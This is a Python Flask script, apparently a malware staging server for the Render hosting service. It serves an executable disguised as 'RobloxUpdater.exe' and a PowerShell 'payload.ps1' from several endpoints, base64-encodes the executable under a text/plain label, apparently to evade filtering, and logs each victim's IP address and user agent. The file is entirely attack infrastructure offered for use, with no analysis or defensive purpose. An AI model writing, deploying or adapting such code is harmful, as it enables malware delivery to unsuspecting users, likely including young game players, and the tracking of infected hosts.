# language: Python 3.11+, file: app.py, target: Render
from flask import Flask, send_file, Response, request
import base64, datetime

app = Flask(__name__)
PAYLOAD_EXE = "RobloxUpdater.exe"
PAYLOAD_PS1 = "payload.ps1"

def log_hit(ip, ua, endpoint):
    try:
        with open("hits.log", "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now()}] {ip} | {endpoint} | {ua}\n")
    except Exception:
        pass
    print(f"[+] {ip} -> {endpoint}")

@app.route("/payload")
def payload():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/payload")
    with open(PAYLOAD_EXE, "rb") as f:
        data = f.read()
    return Response(base64.b64encode(data), mimetype="text/plain")

@app.route("/fallback")
def fallback():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/fallback")
    with open(PAYLOAD_EXE, "rb") as f:
        data = f.read()
    return Response(base64.b64encode(data), mimetype="text/plain")

@app.route("/payload.ps1")
def ps1():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/payload.ps1")
    return send_file(PAYLOAD_PS1, mimetype="text/plain")

@app.route("/raw_exe")
def raw_exe():
    log_hit(request.remote_addr, request.headers.get("User-Agent",""), "/raw_exe")
    return send_file(PAYLOAD_EXE, mimetype="application/octet-stream")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)